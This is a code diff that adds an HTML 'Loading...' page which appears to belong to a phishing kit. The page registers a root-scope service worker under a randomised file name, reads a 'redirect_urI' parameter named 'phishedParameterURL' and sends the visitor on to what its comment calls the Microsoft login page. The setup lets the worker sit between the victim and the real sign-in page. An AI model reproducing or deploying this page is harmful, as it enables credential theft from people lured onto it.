@@ -1,0 +1,31 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+</head>
+<body>
+    <script>
+        if ("serviceWorker" in navigator) {
+            navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
+                scope: "/",
+            })
+            .then((registration) => {
+                // Wait a moment for service worker to activate
+                setTimeout(() => {
+                    const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");
+                    const phishedURL = new URL(decodeURIComponent(phishedParameterURL));
+                    // Redirect to Microsoft login page
+                    window.location.href = phishedURL.href;
+                }, 1000);
+            })
+            .catch((error) => {
+                console.error("Service worker registration failed:", error);
+            });
+        } else {
+            console.error("Service workers are not supported by this browser");
+        }
+    </script>
+</body>
+</html>
